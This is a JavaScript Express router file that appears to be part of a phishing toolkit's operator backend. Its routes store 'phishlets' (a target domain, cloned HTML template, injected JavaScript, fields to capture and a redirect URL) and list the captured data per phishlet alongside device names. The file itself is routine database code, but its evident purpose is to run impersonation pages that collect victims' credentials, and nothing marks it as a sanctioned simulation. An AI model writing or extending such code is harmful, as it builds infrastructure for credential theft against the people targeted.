const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

router.get('/', authMiddleware, async (req, res) => {
  const result = await db.query('SELECT * FROM phishlets ORDER BY created_at DESC');
  res.json(result.rows);
});

router.post('/', authMiddleware, async (req, res) => {
  const { name, targetDomain, htmlTemplate, cssOverride, jsInject, captureFields, redirectUrl } = req.body;
  const result = await db.query(
    `INSERT INTO phishlets (name, target_domain, html_template, css_override, js_inject, capture_fields, redirect_url, created_by)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *`,
    [name, targetDomain, htmlTemplate, cssOverride, jsInject, JSON.stringify(captureFields), redirectUrl, req.user.id]
  );
  res.json(result.rows[0]);
});

router.get('/captures/:phishletId', authMiddleware, async (req, res) => {
  const result = await db.query(
    `SELECT pc.*, d.device_name FROM phishlet_captures pc
     JOIN devices d ON pc.device_id = d.id WHERE pc.phishlet_id = $1 ORDER BY captured_at DESC`,
    [req.params.phishletId]
  );
  res.json(result.rows);
});

module.exports = router;
